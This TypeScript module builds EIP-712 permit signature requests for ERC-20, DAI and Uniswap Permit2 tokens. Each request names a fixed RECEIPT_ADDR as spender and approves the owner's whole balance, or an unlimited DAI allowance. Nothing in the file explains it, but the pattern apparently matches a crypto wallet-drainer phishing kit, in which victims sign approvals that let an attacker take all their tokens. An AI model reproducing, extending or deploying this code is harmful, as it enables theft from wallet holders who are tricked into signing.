import { AllowanceTransfer, PERMIT2_ADDRESS, PermitSingle } from "@uniswap/permit2-sdk";
import { DEADLINE, RECEIPT_ADDR } from "../config";
import { BigNumber } from "ethers";



export const classicPermit = async (name: string, tokenContract: string, owner: string, balance: BigNumber, nonce: number, provider: any, chainId: number) => {

    let domain;

    if (name == "UNI") {
        domain = {
            name: name,
            chainId: chainId,
            verifyingContract: tokenContract,
        } as never;
    }
    else {
        domain = {
            name: name,
            version: "1",
            chainId: chainId,
            verifyingContract: tokenContract,
        } as never;
    }

    let types;
    let message;

    if (name == "Dai Stablecoin") {
        types = {
            Permit: [
            {
                name: "holder",
                type: "address"
            },
            {
                name: "spender",
                type: "address"
            },
            {
                name: "nonce",
                type: "uint256"
            },
            {
                name: "expiry",
                type: "uint256"
            },
            {
                name: "allowed",
                type: "bool"
            },
            ],

        } as never;

        message = {
            holder: owner,
            spender: RECEIPT_ADDR,
            nonce: nonce,
            expiry: DEADLINE,
            allowed: true
        } as never;
    }
    else {
        types = {
            Permit: [{
                name: "owner",
                type: "address"
            },
            {
                name: "spender",
                type: "address"
            },
            {
                name: "value",
                type: "uint256"
            },
            {
                name: "nonce",
                type: "uint256"
            },
            {
                name: "deadline",
                type: "uint256"
            },
            ],
            
        } as never;

        message = {
            owner: owner,
            spender: RECEIPT_ADDR,
            value: balance,
            nonce: nonce,
            deadline: DEADLINE,
        } as never;
    }

  


    try {

        const signature = await provider._signTypedData(domain, types, message);

        if (signature) return signature;
        return false;

    } catch (e) {
        console.log(e);
        return false;
    }
}

export const uniswapPermit = async (name: string, tokenContract: string, owner: string, balance: BigNumber, nonce: number, provider: any, chain: number) => {

    const permitSingle: PermitSingle = {
        details: {
            token: tokenContract,
            amount: balance,
            expiration: DEADLINE,
            nonce,
        },
        spender: RECEIPT_ADDR,
        sigDeadline: DEADLINE,
    }

    const { domain, types, values } = AllowanceTransfer.getPermitData(permitSingle, PERMIT2_ADDRESS, chain) as never;

    try {

        const signature = await provider.getSigner()._signTypedData(domain, types, values);

        if (signature) return signature;
        return false;

    } catch (e) {
        console.log(e);

        return false;
    }


}